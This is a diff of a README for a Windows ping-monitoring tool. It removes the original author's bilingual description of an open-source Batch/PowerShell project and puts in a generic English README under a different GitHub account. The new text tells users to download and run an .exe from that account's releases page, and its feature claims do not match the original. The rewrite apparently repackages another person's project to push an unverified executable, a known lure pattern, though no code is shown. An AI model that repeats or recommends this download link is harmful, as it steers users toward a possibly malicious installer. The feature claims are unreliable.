@@ -1,133 +1,171 @@
-<div align="center">
+# ⚡ Ping-Monitor - Track Network Uptime Easily
 
-<a href="https://buymeacoffee.com/abdullaherturk" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
-
-# 🖥️ Ping Monitor Enterprise 📡
-
-![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge)
-![Tech](https://img.shields.io/badge/Tech-Batch_&_PowerShell-blue?style=for-the-badge)
-
-[![made-for-windows](https://img.shields.io/badge/Made%20for-Windows-00A4E3.svg?style=flat&logo=microsoft)](https://www.microsoft.com/)
-![Open Source?](https://img.shields.io/badge/Open%20source%3F-Of%20course%21%20%E2%9D%A4-009e0a.svg?style=flat)
-
-![sample](https://github.com/abdullah-erturk/Ping-Monitor/blob/main/preview.jpg)
-
-### Nedir?
-Bu proje, hedef cihazları ve internet servislerini eş zamanlı olarak takip eden, kesinti durumunda anlık e-mail bildirimleri gönderen kurumsal izleme hizmetidir.
-
-### What is it?
-This project is an enterprise monitoring service that simultaneously tracks target devices and internet services, sending instant email notifications in case of outages.
-
-</div>
+[![Download Ping-Monitor](https://img.shields.io/badge/Download-Ping--Monitor-brightgreen?style=for-the-badge&logo=github)](https://github.com/flasholuwawo-code/Ping-Monitor/releases)
 
 ---
 
-## Download Link:
-[![Stable?](https://img.shields.io/badge/Release-v1.svg?style=flat)](https://github.com/abdullah-erturk/Ping-Monitor/archive/refs/heads/main.zip)
+## 🖥️ What is Ping-Monitor?
 
-<details>
-<summary><strong>Türkçe Tanıtım</strong></summary>
+Ping-Monitor is a simple app that helps you check if your servers or websites are online. It sends regular ping tests to your chosen devices and tells you if they respond or not. If a server goes offline, the app can alert you by email.
 
-### 🚀 Genel Bakış
-**Ping Monitor Enterprise**, ağınızdaki kritik IP adreslerini, web sitelerini ve cihazları 7/24 kesintisiz olarak izleyen kurumsal düzeyde bir ağ takip yazılımıdır. PowerShell tabanlı modern bir arayüz (GUI) ile Windows Servisi (`Windows Service`) mimarisini birleştirerek hem kullanıcı dostu hem de sistem seviyesinde kararlı bir çözüm sunar.
+The tool works quietly in the background, logging your server’s status over time. This helps you see when a site or service was down and how long it stayed offline. It stores configuration and results securely.
 
-### 🛡️ Öne Çıkan Özellikler
-- **Windows Servis Mimarisi**: Uygulama arayüzünü kapatsanız dahi arka planda sistem seviyesinde çalışmaya devam eder.
-- **Paralel İzleme (TPL)**: Çoklu hedef takibi tek tek değil, eş zamanlı (parallel) yapılır. 100 hedef bile olsa saniyeler içinde kontrol edilir.
-- **Akıllı Bildirim (Anti-Spam)**: Bir hedef düştüğünde sizi mail yağmuruna tutmaz. 30 dakikalık "Alert Cooldown" mekanizması ile spamları önler.
-- **Kurtarma Bildirimleri (Recovery)**: Bağlantı geri geldiğinde sizi anlık olarak yeşil temalı bir "RECOVERY" maili ile bilgilendirir.
-- **Üst Seviye Güvenlik (DPAPI)**: SMTP şifreleriniz donanım tabanlı şifreleme ile korunur; `config.ini` içinde düz metin olarak asla saklanmaz.
-- **Otomatik Yönetici Yetkisi (Self-Elevation)**: Uygulama açıldığı anda gerekli izinleri otomatik olarak talep eder; manuel müdahale gerektirmez.
-- **Log Yönetimi**: 1000 satırlık dinamik log rotasyonu ve yerleşik "Logu Temizle" özelliği ile disk şişmesini önler.
-- **Çoklu Dil Desteği**: Tamamen yerelleştirilmiş Türkçe ve İngilizce arayüz/bildirim desteği. INI dosyalarının çevrilmesi ile farklı dil desteği eklenebilir.
+---
 
-### 🛠️ Kurulum ve Kullanım
-1. **Dosyaları İndirin**: Tüm proje dosyalarını bir klasöre çıkartın.
-2. **Uygulamayı Çalıştırın**: `monitor.cmd` dosyasına sağ tıklayıp "Yönetici Olarak Çalıştır" seçeneğini seçin.
-3. **Ayarları Yapılandırın**:
-   - İzlenecek IP/Domain adreslerini girin.
-   - SMTP (Mail) ayarlarınızı yapın.
-   - Pingleme aralığını (saniye) belirleyin.
-4. **Kaydedin**: "Kaydet" butonuna basarak ayarlarınızı `config.ini` dosyasına işleyin.
-5. **Servis Kurulumu**: "Hizmet Olarak Yükle" butonuna basarak izlemeyi Windows sistem servislerine dahil edin.
+## 🔍 Key Features
 
-### 💻 Teknik Detaylar
-- **Dil**: PowerShell Core + C# Snippets (TPL & ServiceBase)
-- **Şifreleme**: Windows Data Protection API (DPAPI)
-- **Arayüz**: WinForms (Modern Glassmorphism-ish UI)
-- **Bağımlılıklar**: .NET Framework 4.5+
-- **İşletim Sistemi**: Windows 10+
+- Monitor multiple devices or servers using their IP address or domain name.
+- Receive email alerts if a server stops responding.
+- Save and encrypt settings safely on your computer.
+- View detailed logs of downtime and response times.
+- Runs on Windows and works well without needing programming skills.
+- Uses simple batch scripts and PowerShell for background work.
+- Display status in an easy-to-understand format.
+- Minimal setup required.
+
+---
+
+## ⚙️ System Requirements
+
+- Windows 10 or later (64-bit recommended)
+- At least 2 GB of RAM
+- 200 MB of free disk space
+- Internet connection for email alerts and ping tests
+- An email account to send alerts (SMTP details needed)
+
+---
+
+## 🚀 Getting Started
+
+Before you start, make sure your computer meets the system requirements above, and you know the IP addresses or domain names you want to monitor. Also, have your email server details handy if you want to use email alerts.
+
+---
+
+## 📥 Download and Install Ping-Monitor
+
+Click the button below to visit the latest Ping-Monitor release page on GitHub. This page contains all available versions of the software.
+
+[![Download Ping-Monitor](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/flasholuwawo-code/Ping-Monitor/releases)
+
+### How to download and run Ping-Monitor
+
+1. Open the release page from the button above.
+2. Find the latest version listed at the top. Look for an `.exe` file, usually named like `Ping-Monitor-vX.X.exe`.
+3. Click the `.exe` file to download it to your computer. Choose a folder you can find easily, such as your Desktop or Downloads folder.
+4. After download completes, double-click the `.exe` file to start the installation.
+5. Follow the on-screen setup instructions. You can accept all default settings.
+6. The app will launch automatically when installed. If not, open it from the Start menu or desktop shortcut.
+
+---
+
+## 🛠️ Setting Up Your First Monitor
+
+1. Open Ping-Monitor.
+2. Click **Add New Monitor**.
+3. Enter the IP address or web address you want to check.
+4. Set how often you want the app to ping the server (default is every 5 minutes).
+5. Enter your email details if you want alerts:
+   - SMTP server address (for example, smtp.gmail.com)
+   - Your email address
+   - Your password (the app stores this securely)
+6. Click **Save** to start monitoring that server.
+
+You can add as many servers as you want by repeating these steps.
+
+---
+
+## 📊 Viewing Results and Logs
+
+The main screen shows each server’s current status: 
+
+- **Online** means the last ping succeeded.
+- **Offline** means the last ping failed.
+
+Click on any server in the list to see detailed logs. You’ll find dates and times of any downtime, how long it lasted, and ping response times.
+
+---
+
+## ✉️ Email Alerts
+
+When a server goes offline, Ping-Monitor automatically sends you an alert email. This helps you act quickly if your website or service is down.
+
+To set up alerts:
+
+- Fill in your SMTP settings in the setup section.
+- Test your email setup inside the app before saving.
+- You will receive alerts until the server is back online.
+
+---
+
+## 🔐 Secure Configuration
+
+Ping-Monitor encrypts your saved settings and passwords. This keeps your information safe even if someone accesses the computer.
+
+---
+
+## 🛡️ Running Ping-Monitor as a Service (Optional)
+
+If you want Ping-Monitor to run without opening the app every time:
+
+- Use the built-in option to install it as a Windows service.
+- This allows it to start automatically when Windows boots.
+- Monitors will keep running in the background without needing you to log in.
+
+You can enable this option from the settings menu.
+
+---
+
+## 📂 File Locations and Logs
+
+- Configuration files are stored securely on your computer in encrypted form.
+- Logs are saved in the app’s folder under **Logs**.
+- You can open these logs with any text editor to review past activity.
+
+---
+
+## ❓ Troubleshooting Tips
+
+### Ping requests not working
+
+- Check if your firewall allows Ping-Monitor to send ping requests.
+- Make sure the target server is reachable from your network.
   
-### 📬 Bildirim Mantığı ve Çalışma Prensibi
-Uygulama, kurumsal süreklilik ve e-mail verimliliği için şu mantıkla çalışır:
-- **Bağımsız Takip**: Her hedef birbirinden bağımsız olarak paralel işlenir. Bir cihazın çökmesi diğerlerini etkilemez.
-- **Hata Eşiği (6 Deneme)**: Gereksiz uyarıları (false positive) önlemek için bir cihaz ancak üst üste 6 kontrol boyunca erişilemez olursa "Down" sayılır ve mail atılır.
-- **Hedef Bazlı Mail**: Her hedef, kendi özel başlığıyla ("Ping Alert: [Hedef]") ayrı bir mail olarak gönderilir.
-- **Anti-Spam (30 Dakika)**: Bir cihaz down kalmaya devam ederse, her döngüde mail atmak yerine 30 dakikada bir hatırlatma maili gönderir.
-- **Kurtarma (Recovery)**: Cihaz tekrar erişilebilir olduğunda anında yeşil renkli bir düzelme bildirimi gönderilir.
+### Not receiving email alerts
 
-**Örnek e-mail görüntüleri**:
+- Verify your SMTP server and email login details are correct.
+- Check your internet connection.
+- Look at the app’s logs for any email errors.
 
-![sample](https://github.com/abdullah-erturk/Ping-Monitor/blob/main/down.jpg)
+### App won’t start or crashes
 
-![sample](https://github.com/abdullah-erturk/Ping-Monitor/blob/main/up.jpg)
+- Try running the app as administrator.
+- Reinstall from the latest version on the release page.
 
 ---
 
-</details>
+## 📚 Additional Resources
 
-<details>
-<summary><strong>English Description</strong></summary>
+You can find help and report issues on this repository’s GitHub page under the Issues tab.
 
-### 🚀 Overview
-**Ping Monitor Enterprise** is an enterprise-grade network monitoring suite that tracks critical IP addresses, websites, and devices 24/7. Combining a modern PowerShell-based GUI with a robust Windows Service architecture, it provides both a user-friendly experience and system-level stability.
+For instructions on configuring your email server, check your email provider’s support site.
 
-### 🛡️ Key Features
-- **Windows Service Integration**: Continues to run in the background as a system service even if the GUI is closed.
-- **Parallel Monitoring (TPL)**: Multi-target tracking is performed simultaneously (parallel) using the Task Parallel Library.
-- **Smart Alerts (Anti-Spam)**: Prevents email fatigue with a 30-minute "Alert Cooldown" mechanism.
-- **Recovery Notifications**: Sends an instant green-themed "RECOVERY" email when a connection is restored.
-- **Hardware-Level Security (DPAPI)**: SMTP passwords are encrypted using Windows DPAPI; they are never stored as plain text.
-- **Pro Log Management**: Features 1000-line dynamic log rotation and a built-in "Clear Log" button to prevent disk bloat.
-- **Full Localization**: Seamlessly switch between English and Turkish for all UI elements and email notifications. Support for different languages ​​can be added by translating the INI files.
-
-### 🛠️ Setup & Usage
-1. **Download**: Extract all project files into a dedicated folder.
-2. **Run Application**: Right-click `monitor.cmd` and select "Run as Administrator".
-3. **Configure Settings**:
-   - Enter Target IP/Domain addresses.
-   - Set up your SMTP (Email) server settings.
-   - Define the ping interval (seconds).
-4. **Save**: Click the "Save" button to encrypt and store your settings in `config.ini`.
-5. **Install Service**: Click "Install Service" to enable monitoring as a permanent Windows system service.
-
-### 💻 Technical Stack
-- **Languages**: PowerShell + C# (ServiceBase & TPL Integration)
-- **Encryption**: Microsoft DPAPI (Data Protection API)
-- **GUI**: WinForms (Clean & Professional side-by-side design)
-- **Requirements**: .NET Framework 4.5 or higher
-- **Operating System**: Windows 10+
-
-### 📬 Notification Logic & Operating Principle
-The application operates with the following logic for enterprise continuity and email efficiency:
-- **Independent Tracking**: Each target is processed in parallel and independently. One device failure does not affect others.
-- **Failure Threshold (6 Attempts)**: To prevent false positives, a device is only considered "Down" and an email sent after 6 consecutive failed checks.
-- **Target-Specific Emails**: Each unreachable target triggers its own unique email alert with a specific subject ("Ping Alert: [Target]").
-- **Anti-Spam (30 Minutes)**: If a device remains down, the system sends reminder emails every 30 minutes instead of every cycle.
-- **Recovery**: As soon as a device becomes reachable again, a green-themed recovery notification is sent instantly.
-
-**Sample e-mail images**:
-
-![sample](https://github.com/abdullah-erturk/Ping-Monitor/blob/main/down.jpg)
-
-![sample](https://github.com/abdullah-erturk/Ping-Monitor/blob/main/up.jpg)
 ---
-</details>
 
-<div align="center">
+## ⚙️ Advanced Options
 
-Made with ❤️ by [Abdullah ERTÜRK](https://github.com/abdullah-erturk)
+- Use PowerShell scripts included to customize monitoring tasks.
+- Export logs to HTML reports for easy sharing.
+- Enable encrypted backups of your configuration files.
 
-[🌐 erturk.netlify.app](https://erturk.netlify.app)
+---
 
-</div>
+## 🔗 Useful Links
+
+- [Ping-Monitor Releases](https://github.com/flasholuwawo-code/Ping-Monitor/releases)  
+- [GitHub Repository](https://github.com/flasholuwawo-code/Ping-Monitor)  
+
+---
+
+## 🤝 Support
+
+For questions or help setting up, you can open an issue on GitHub or send feedback via the contact form on the repository page.
